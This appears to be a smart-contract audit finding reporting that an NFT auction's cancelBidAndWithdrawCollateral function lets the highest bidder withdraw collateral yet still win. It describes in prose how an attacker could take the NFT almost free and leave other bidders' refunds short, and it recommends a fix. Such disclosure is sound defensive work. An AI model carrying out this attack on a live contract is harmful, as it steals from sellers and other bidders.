# The function cancelBidAndWithdrawCollateral permits the current highest bidder to withdraw assets before the auction concludes.

## Summary
The function `cancelBidAndWithdrawCollateral` permits the current highest bidder to withdraw assets before the auction concludes.

## Vulnerability Detail
This vulnerability hinges on a user maintaining the position of the highest bidder. User A places a bid for `tokenId` 0 on an NFT with a substantial amount. User A subsequently executes `cancelBidAndWithdrawCollateral`, thereby annulling the bid and withdrawing collateral, yet remains the highest bidder for `tokenId` 0. Consequently, when the auction ends, User A obtains the asset almost freely.

Another potential outcome arises when:

`User A` places a bid.
`User B` places a bid.
`User C` places a significantly high bid of XXX ether to retain the highest bidder status, then invokes `cancelBidAndWithdrawCollateral`. Upon bid closure, the previous owner of the `tokenId` receives XXX ether. Consequently, the remaining ether balance in the contract might be insufficient for `User A and User B` to successfully claim their ether. However, if `User A and User B` claim their tokens before the bid closure, the previous owner won't receive payment due to insufficient ether in the contract.


## Impact
The attacker could acquire the NFT at nearly zero cost. Additionally, the remaining ether in the contract might not suffice for every other user who placed a bid to reclaim their ether.

## Recommendation
Implement a conditional Statement that prevents highest Bidder from calling `cancelBidAndWithdrawCollateral`  as implemented in `_cancelBid`
